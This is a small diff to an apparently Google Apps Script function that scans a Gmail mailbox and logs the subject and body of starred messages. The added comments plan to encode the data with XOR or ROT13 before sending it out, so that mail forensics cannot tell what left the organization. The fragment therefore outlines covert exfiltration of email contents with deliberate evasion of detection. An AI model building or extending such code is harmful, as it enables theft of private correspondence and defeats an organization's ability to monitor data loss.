@@ -75,6 +75,8 @@ function gmailKeySearch() {
     for (var i = 0; i < messages.length; i++) {
       if (messages[i].isStarred())
       {
+        // Could probably introduce some basic XOR functionality or ROT13 to encode data before sending
+        // Mail forensics would have difficulty discerning what data left the organization since we aren't actually forwarding an email
         Logger.log(messages[i].getSubject());
         var subject = messages[i].getSubject();
         Logger.log(messages[i].getBody());
